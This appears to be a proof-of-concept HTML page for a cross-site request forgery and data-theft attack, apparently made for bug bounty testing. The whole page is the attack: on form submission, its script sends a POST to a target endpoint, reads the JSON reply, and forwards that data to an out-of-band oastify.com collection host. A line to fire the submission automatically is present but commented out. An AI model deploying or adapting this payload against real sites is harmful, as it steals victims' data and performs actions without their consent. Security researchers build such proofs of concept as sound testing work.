<html>
  <body>
    <form id="myForm" method="POST" action="https://hackerone/stories-of-2024/new">
      <input type="submit" value="Submit request" />
    </form>

    <script>
      // Intercept the form submission
      document.getElementById("myForm").onsubmit = function (event) {
        //event.preventDefault();  // Prevent the default form submission

        // Create FormData object to capture the form data
        const formData = new FormData(document.getElementById("myForm"));

        // Perform the first fetch request (submit the form to the specified action)
        fetch("https://hackerone/stories-of-2024/new", {
          method: "POST",
          body: formData,
        })
          .then((response) => response.json())  // Assuming the response is JSON
          .then((data) => {
            console.log("Response from first request:", data);

            // Store the response in a variable for later use
            const responseData = data;  // Modify this according to your response structure

            // Now use the response data to send to another endpoint
            return fetch("https://6bihv154h3l4h09rv9kkonfprgx7lz9o.oastify.com/", {
              method: "POST",
              headers: {
                "Content-Type": "application/json", // Assuming you're sending JSON data
              },
              body: JSON.stringify({ response: responseData }),
            });
          })
          .then((secondResponse) => secondResponse.json())  // Handle the second response
          .then((secondData) => {
            console.log("Response from second request:", secondData);
          })
          .catch((error) => {
            console.error("Error during the requests:", error);
          });
      };

      // Optionally, trigger the form submission automatically (you can remove this if not needed)
      // document.forms[0].submit();  // This will trigger the submit event and initiate the fetch logic
    </script>
  </body>
</html>
